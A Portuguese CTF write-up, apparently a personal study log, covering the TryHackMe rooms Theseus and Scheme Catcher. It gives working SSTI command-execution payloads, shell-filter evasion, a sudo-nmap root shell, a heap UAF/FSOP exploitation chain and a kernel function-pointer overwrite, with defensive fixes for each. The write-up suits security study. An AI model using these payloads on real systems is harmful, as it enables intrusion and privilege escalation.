# Trilha-de-cyber-
Trilha documentada de Segurança da informação.

# Trilha de Cibersegurança: Theseus e Scheme Catcher

Registro de duas salas de dificuldade Insane concluídas no TryHackMe, ambas da série SuitGuy. Este documento descreve o caminho técnico de cada sala, os pontos onde é fácil se perder e as correções defensivas de cada falha. Serve como material de revisão e como registro de evolução.

Nota de método: a seção do Theseus traz o meu percurso real, com as flags que obtive e o ponto exato em que consultei um walkthrough. A seção do Scheme Catcher descreve a cadeia técnica e as vulnerabilidades da sala, com a conclusão confirmada no perfil. Todo o material vale apenas para as máquinas autorizadas do TryHackMe.

Aviso sobre as flags: as flags do Theseus foram removidas de propósito, para nao entregar a resposta e nao atrapalhar quem for resolver a sala. Ficam como THM{...}. A flag final do Scheme Catcher pode ser mantida como registro pessoal, mas convém remover também se este documento for para um repositório público.

- Data de conclusão: 25/09/2026
- Plataforma: TryHackMe
- Salas: Theseus (Insane) e Scheme Catcher (Insane)

## Índice

1. [Theseus](#theseus)
2. [Scheme Catcher](#scheme-catcher)
3. [Comparação das duas salas](#comparação-das-duas-salas)
4. [Princípios que ficam para as próximas salas](#princípios-que-ficam-para-as-próximas-salas)
5. [Autoavaliação](#autoavaliação)
6. [Registro de evolução](#registro-de-evolução)

## Theseus

### Meu percurso, resumido por ambiente

Registro do caminho que percorri, com a evidência que abriu cada ambiente e a flag obtida em cada um. Anotar qual pista deu acesso ao próximo host é o que transforma uma sequência de comandos em uma investigação que dá para explicar e reproduzir.

**1. Minos, entrada pela aplicação web.** A aplicação na porta `8080` processava o parâmetro `key` como template Jinja, o que permitia executar expressões no servidor. Essa falha é SSTI, injeção em template no lado do servidor. Com esse acesso, li `/home/minos/Minos_Flag` e encontrei em `/home/minos/Crete_Shores` a credencial `entrance:Knossos`, que abriu a etapa seguinte.
Flag Minos: `THM{...} (removida para nao entregar a resposta da sala)`

**2. Labyrinth, acesso e elevação de privilégios.** A partir da Minos, abri shell e acessei `entrance@Labyrinth.lxd` com a credencial encontrada. Ali foi preciso elevar privilégio localmente. No laboratório autorizado, executei um exploit público para a CVE-2021-4034, o PwnKit. Com privilégio elevado, li `/home/minotaur/Labyrinth_Flag`. A sequência importa: a credencial da primeira máquina abriu a segunda, mas não dispensou a elevação de privilégio para chegar à evidência.
Flag Labyrinth: `THM{...} (removida para nao entregar a resposta da sala)`

**3. Minotaur, exploração do mesmo ambiente.** Ainda no Labyrinth, o acesso elevado permitiu ler `/home/ariadne/Minotaur_Flag`. Encontrei também a credencial `ariadne:TheLover` em `/home/minotaur/ariadne`, mais uma pista da trilha entre usuários e máquinas da sala.
Flag Minotaur: `THM{...} (removida para nao entregar a resposta da sala)`

**4. Athens, última conexão.** A etapa final dependia do arquivo `/home/ariadne/ariadne`, uma imagem JPEG com cabeçalho corrompido. Sendo preciso sobre esta parte: consultei um walkthrough público para identificar a pista `shore:KingAegeus` e não concluí pessoalmente a restauração e inspeção da imagem. Com essa credencial acessei `shore@Athens.lxd` e li `/home/shore/Athens_flag`, obtida na instância ativa e aceita pela TryHackMe.
Flag Athens: `THM{...} (removida para nao entregar a resposta da sala)`

O que a sala ensinou: correlacionar pistas entre ambientes, explorar uma falha web, aproveitar credenciais expostas, elevar privilégio e reconhecer que um arquivo aparentemente inutilizável podia conter a próxima indicação. O ponto a repetir no processo é registrar, em cada etapa, qual evidência deu acesso ao próximo ambiente.

O detalhamento técnico por etapa abaixo aprofunda cada uma dessas passagens, incluindo os comandos e os desvios da sala.

### Cadeia resumida

```text
Portas 22 e 8080
       v
Parametro HTTP oculto: key
       v
SSTI em aplicacao Flask/Jinja
       v
Execucao de comandos como minos
       v
Credenciais em arquivo mais reverse shell
       v
sudo nmap leva a root na primeira maquina
       v
Descoberta da rede interna
       v
SSH no Labyrinth
       v
PwnKit CVE-2021-4034 leva a root
       v
JPEG corrompido contem novas credenciais
       v
SSH em Athens como shore
       v
Flag final
```

### Etapa 1: enumeração

Scan completo de portas e serviços:

```bash
nmap -Pn -sC -sV -p- <IP>
```

Serviços encontrados:

1. `22/tcp`: SSH.
2. `8080/tcp`: aplicação Python com Werkzeug.

A página da porta 8080 exibia uma sequência parecida com uma cifra Scytale. Esse foi o primeiro desvio da sala: tentar quebrar a sequência como criptografia consumia tempo. A pista importante era o parâmetro `key`.

Com enumeração de parâmetros, por Arjun ou teste manual:

```text
http://theseus.thm:8080/?key=teste
```

A aplicação inseria a entrada do parâmetro `key` diretamente em um template Jinja.

### Etapa 2: confirmar a SSTI

Prova inofensiva primeiro, antes de qualquer payload de execução:

```text
?key={{7*7}}
```

A resposta contendo `49` prova que o servidor avaliou a expressão. Isso separa SSTI de simples reflexão de texto, e é uma prova melhor que partir direto para uma reverse shell porque não altera estado e confirma a causa raiz.

### Etapa 3: da SSTI para execução de comandos

Payloads diretos como `{{os.popen('id').read()}}` podiam falhar porque `os` não estava disponível no contexto do template. O caminho funcional alcançava os globais da aplicação, os built-ins do Python e então importava `os`:

```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

O resultado mostrava execução como o usuário `minos`.

Dificuldade central: o payload atravessava cinco camadas de interpretação, a saber URL, parser HTTP, Jinja, Python e shell. Um espaço, aspas ou `&` podia ser consumido pela camada errada e gerar erro 400 ou erro interno, mesmo com a vulnerabilidade confirmada. Trocar espaços por `${IFS}` resolvia parte disso, porque o shell expande `IFS` como separador:

```bash
ls${IFS}-la${IFS}/home/minos
```

Boa prática: mudar uma coisa por vez antes de tentar a shell reversa.

```bash
id
pwd
ls${IFS}-la
cat${IFS}/etc/passwd
```

### Etapa 4: credenciais em arquivo

Em `/home/minos` apareciam `Minos_Flag` e `Crete_Shores`. O segundo continha `entrance : Knossos`, credenciais em texto claro legíveis pelo usuário comprometido. Codificar o comando de shell em Base64 evitava conflitos de aspas entre as camadas:

```bash
echo '<BASE64>' | base64 -d | bash
```

### Etapa 5: escalada na máquina Minos

```bash
sudo -l
```

Mostrava que `minos` podia executar `/usr/bin/nmap` como root sem senha. Versões de Nmap com suporte a NSE executam código Lua, então:

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > "$TF"
sudo nmap --script="$TF"
```

Isso produzia root na primeira máquina.

Correção defensiva: remover `NOPASSWD: /usr/bin/nmap`, e se houver necessidade operacional usar um wrapper com argumentos fixos, além de monitorar execuções de Nmap por usuários inesperados.

### Etapa 6: o labirinto era uma rede interna

Como root, a enumeração de interfaces, rotas e vizinhos revelava hosts internos: Minos, Labyrinth e Athens. O labirinto da narrativa era o movimento lateral. As credenciais `entrance:Knossos` funcionavam no Labyrinth:

```bash
ssh entrance@<IP_LABYRINTH>
```

### Etapa 7: root no Labyrinth

O host estava vulnerável ao PwnKit, CVE-2021-4034, no `pkexec`. Antes de rodar o exploit, o certo era verificar versão da distribuição, presença do binário `pkexec`, bit SUID e se o sistema estava realmente sem o patch, em vez de disparar um PoC só porque o LinPEAS o destacou.

Correção defensiva: atualizar o PolicyKit, remover temporariamente o SUID do `pkexec` onde não for possível atualizar, e monitorar execuções incomuns.

### Etapa 8: recuperação do JPEG e acesso ao Athens

A enumeração encontrava credenciais do usuário `ariadne`, um arquivo `ariadne` identificado apenas como `data` e um binário `thread` que sugeria um desafio ret2win. O binário era um desvio. O arquivo `ariadne` continha um JPEG com cabeçalho danificado:

```bash
grep -oba $'\xff\xdb' ariadne
xxd ariadne | head
binwalk ariadne
```

Reconstruindo a imagem, apareciam credenciais para Shore. O nome real do usuário Linux era minúsculo, e essa diferença era uma dificuldade deliberada, já que nomes de usuário no Linux diferenciam maiúsculas de minúsculas:

```bash
ssh shore@<IP_ATHENS>
```

### Enganos mais comuns em Theseus

1. Tratar a mensagem inicial como cifra real, e não como pista para `key`.
2. Parar após um único payload de SSTI que retornou erro.
3. Confundir erro de codificação com ausência de vulnerabilidade.
4. Não rodar `sudo -l` logo após a shell.
5. Achar que root no primeiro host era o fim da sala.
6. Ignorar interfaces e redes internas.
7. Confiar no LinPEAS sem validar a vulnerabilidade.
8. Perder tempo no binário `thread` em vez do arquivo `ariadne`.
9. Usar `Shore` com maiúscula no SSH.

## Scheme Catcher

Sala mais densa, que mistura engenharia reversa, heap exploitation, FSOP, containerização, SSH e um módulo de kernel vulnerável. A sala tem quatro objetivos: flag inicial, `foothold.txt`, `user.txt` e `root.txt`.

### Cadeia resumida

```text
Chave da Side Quest libera o firewall na porta 21337
       v
Nmap: 22, 80 e 9004
       v
/dev/ com 4.2.0.zip
       v
beacon.bin
       v
strings, GDB e ltrace revelam flag, chave e endpoint oculto
       v
/7ln6Z1X9EF/ leva a foothold.txt mais server e libc
       v
UAF no servico da porta 9004
       v
House of Water mais tcache mais FSOP
       v
Shell root dentro de container
       v
Chave SSH do usuario agent
       v
Acesso ao host
       v
Falhas em /dev/kagent
       v
Funcao op_execute leva a root
```

### Etapa 1: chave da Side Quest

A chave para liberar o firewall estava em um banco KeePass `.Passwords.kdbx` da máquina do Dia 9 do Advent of Cyber. O `keepass2john` não suportava o formato KDBX 4.x. A solução foi usar uma ferramenta compatível e encontrar a chave em um anexo de imagem, e não no campo de senha.

Lição: quando uma ferramenta falha, leia o erro. "Formato não suportado" não é o mesmo que "senha incorreta".

### Etapa 2: enumeração inicial

Após usar a chave na porta `21337`, o scan mostrava SSH em 22, Apache em 80 e um serviço customizado de Payload Storage em 9004. Fuzzing do site:

```bash
ffuf -u http://<IP>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -fc 404
```

Encontrava `/dev/`, com directory listing habilitado, expondo `4.2.0.zip` que continha `beacon.bin`. As falhas aqui eram directory listing ligado, artefatos de desenvolvimento publicados e um binário cliente distribuído com informação interna.

### Etapa 3: análise do beacon.bin

Metodologia barata primeiro:

```bash
file beacon.bin
checksec --file=beacon.bin
strings beacon.bin
readelf -S beacon.bin
```

O `strings` já expunha a primeira flag, a chave `EastMass`, o caminho `/tmp/b68vC103RH`, o menu interno, mensagens de requisição HTTP e a porta local 4444. A chave também podia ser obtida depurando a comparação:

```gdb
break strcmp
run
info registers rdi rsi
x/s $rdi
x/s $rsi
```

Em x86-64 Linux, os primeiros argumentos chegam em `RDI` e `RSI`. Um continha a entrada e o outro a chave esperada. Havia ainda uma seção `.easter` decodificada com XOR `0x0d`.

Lição de ordem de trabalho: rodar `file`, checar proteções, procurar strings, observar chamadas de biblioteca e só então desmontar o código relevante.

### Etapa 4: endpoint oculto

Executando localmente com a chave `EastMass`, o binário abria a porta local `4444`. Ao enviar a opção `2`, ele tentava carregar um payload, e o caminho aparecia no tráfego:

```http
GET /7ln6Z1X9EF HTTP/1.1
Host: localhost
```

Um listener local mostrava a requisição:

```bash
nc -lvnp 80
```

Consultando esse caminho no alvo, apareciam `foothold.txt`, `4.2.0-R1-1337-server.zip`, `server`, `libc.so.6` e `ld-linux-x86-64.so.2`. A libc fornecida era essencial, porque offsets e estruturas internas mudam entre versões.

### Etapa 5: a vulnerabilidade da porta 9004

O serviço tinha três operações: `create(size)`, `update(index, offset, data)` e `delete(index)`. O erro estava no `delete`:

```c
free(chunks[index]);
// chunks[index] continuava com o endereco antigo
```

O ponteiro não era zerado após o `free`, e o `update` continuava aceitando o índice e escrevendo no endereço liberado. Isso é um Use-After-Free:

```text
create leva a ponteiro valido
delete leva a memoria liberada, mas o ponteiro permanece
update leva a escrita sobre memoria ja administrada pelo allocator
```

Correção no código:

```c
free(chunks[index]);
chunks[index] = NULL;
sizes[index] = 0;
```

Além disso: rejeitar `update` com ponteiro `NULL`, validar `offset` mais tamanho contra o tamanho original, impedir double-free e usar estados explícitos por índice, como `ALLOCATED`, `FREED` e `UNUSED`.

### Etapa 6: exploração do heap

Maior dificuldade técnica da sala. Não havia operação de leitura de chunks, então não havia leak fácil para derrotar o ASLR. A cadeia usava uma técnica leakless inspirada em House of Water, combinada com heap grooming, UAF, corrupção de metadados do tcache, tcache poisoning, corrupção de `stdout`, leak da libc, FSOP no estilo House of Apple 2 e chamada final de `system("sh")`.

Fluxo conceitual:

1. Criar chunks com tamanhos escolhidos.
2. Preencher determinada tcache bin.
3. Liberar um chunk grande mantendo o ponteiro pendurado.
4. Usar `update` sobre o chunk liberado.
5. Alterar metadados e listas do allocator.
6. Fazer uma futura alocação apontar para `_IO_2_1_stdout_`.
7. Corromper `stdout` com flags como `0xfbad3887` para obter um endereço da libc.
8. Calcular a base da libc fornecida.
9. Montar uma estrutura FILE falsa.
10. Usar House of Apple 2 para alcançar `system`.
11. Acionar uma saída e ganhar shell.

Como alguns bits variavam com ASLR, o exploit testava combinações de nibbles até acertar, o que explica precisar de várias tentativas e ser mais rápido a partir da AttackBox.

Erros comuns nesta etapa:

1. Usar uma libc diferente da fornecida.
2. Não iniciar o binário com o loader fornecido nos testes locais.
3. Tratar falha por ASLR como erro lógico do exploit.
4. Alterar vários tamanhos de chunk ao mesmo tempo.
5. Não desenhar o estado das tcache bins após cada operação.
6. Copiar um PoC sem entender quais offsets dependem da versão da libc.
7. Esperar estabilidade de uma técnica parcialmente baseada em brute force.

### Etapa 7: do container para o host

A shell root estava dentro de um container, confirmado pelo hostname e pelo ambiente isolado. No container havia uma chave SSH cuja pública indicava `agent@tryhackme`:

```bash
chmod 600 id_rsa
ssh -i id_rsa agent@<IP>
```

Falhas: chave privada guardada no container, container comprometido com acesso a material de autenticação do host e separação de segredos inadequada.

### Etapa 8: módulo de kernel kagent

`sudo -l` autorizava `agent` a carregar ou remover o módulo `kagent` e alterar as permissões de `/dev/kagent`. A estrutura de contexto do módulo tinha campos adjacentes:

```text
agent_id[16]
session_key[16]
current_op (ponteiro de funcao)
command_buffer[64]
```

Caminho de exploração:

1. Tornar `/dev/kagent` legível.
2. Enviar ao heartbeat um `agent_id` sem terminador nulo adequado.
3. Fazer a resposta ler além do `agent_id`.
4. Vazar o `session_key`.
5. Vazar o endereço de `current_op`, que apontava para `op_ping`.
6. Calcular `op_execute` pelo offset entre as duas funções, de `0x320`.
7. Usar o `session_key` vazado para passar pela validação do update.
8. Sobrescrever `current_op` com o endereço de `op_execute`.
9. Chamar o IOCTL que executa `current_op`.
10. Obter UID 0.

Erros de programação no módulo: leitura não limitada de `agent_id`, dados secretos adjacentes a um campo retornado ao usuário, vazamento de endereço do kernel enfraquecendo o KASLR, ponteiro de função em estrutura modificável, operação perigosa autenticada por um segredo que o próprio módulo vazava e dispositivo acessível por uma regra sudo permissiva demais.

Caminho alternativo: o container era privilegiado e tinha capacidade de montar o disco do host, o que dava uma rota mais simples para a flag final. Correção: nunca rodar com `--privileged`, remover `CAP_SYS_ADMIN`, não expor block devices do host, usar containers rootless, aplicar AppArmor e seccomp e manter segredos do host fora do container.

## Comparação das duas salas

| Sala | Dificuldade central | Vulnerabilidade principal | Competência treinada |
|---|---|---|---|
| Theseus | Separar pistas reais de desvios | SSTI e sudo inseguro | Enumeração, pivoting e investigação de arquivos |
| Theseus | Navegar por vários hosts | Credenciais expostas e sistema desatualizado | Movimento lateral |
| Scheme Catcher | Entender estados internos de memória | UAF, tcache e FSOP | Engenharia reversa e heap exploitation |
| Scheme Catcher | Sair do container e chegar ao host | Chaves expostas, container privilegiado e módulo vulnerável | Segurança de container e de kernel |

## Princípios que ficam para as próximas salas

### Trabalhar com hipóteses verificáveis

```text
Entrada: {{7*7}}
Esperado se houver SSTI: 49
Real: 49
Conclusao: a expressao de template foi avaliada
```

```text
create(0)
delete(0)
update(0)
Se update ainda escreve, o ponteiro liberado continua utilizavel
```

### Mapear a cadeia completa após cada acesso

```bash
id
hostname
pwd
ip addr
ip route
ss -lntup
sudo -l
findmnt
```

Root em container não é root no host. Root no primeiro servidor não é o fim de uma rede segmentada.

### Separar falha da técnica de falha do transporte

Um payload pode falhar por URL encoding, espaços, aspas, shell diferente, firewall, listener no IP errado, ASLR ou libc incorreta. Nada disso prova sozinho que a vulnerabilidade não existe.

### Começar pela análise barata de binários

```bash
file programa
checksec --file=programa
strings -a programa
readelf -h -S programa
ldd programa
```

Depois `ltrace`, `strace`, `gdb` e Ghidra, nessa ordem.

### Desenhar o heap

| Índice | Tamanho | Estado | Destino esperado |
|---:|---:|---|---|
| 0 | `0x88` | alocado | tcache 0x90 |
| 1 | `0x88` | liberado | tcache 0x90 |
| 2 | grande | liberado com UAF | área de corrupção |

Sem saber o estado de cada chunk, o trabalho vira tentativa e erro.

## Autoavaliação

Perguntas para confirmar que o aprendizado ficou:

1. Por que `{{7*7}}` é uma prova melhor de SSTI do que começar por uma reverse shell?
2. Por que `${IFS}` resolvia alguns erros em Theseus?
3. Qual a diferença entre um ponteiro liberado e um ponteiro definido como `NULL`?
4. Por que a libc fornecida em Scheme Catcher precisava ser usada?
5. Por que `uid=0` não provava controle do host?
6. Como o vazamento de `op_ping` permitia achar `op_execute` mesmo com KASLR?

## Registro de evolução

- Data: 25/09/2026
- Salas: Theseus e Scheme Catcher, ambas Insane
- Técnicas exercitadas: SSTI, enumeração, abuso de sudo, pivoting, recuperação de arquivos, UAF, tcache, FSOP, análise de módulo de kernel e escape de container
- Maior dificuldade: manter a cadeia lógica em desafios com muitos desvios
- Próxima missão: reproduzir localmente um UAF pequeno e uma aplicação Flask vulnerável a SSTI, revisando antes a convenção de chamada x86-64, o tcache da glibc, o Jinja e a separação entre container e host
- Método daqui para frente: registrar hipótese, evidência, conclusão e mitigação para cada descoberta
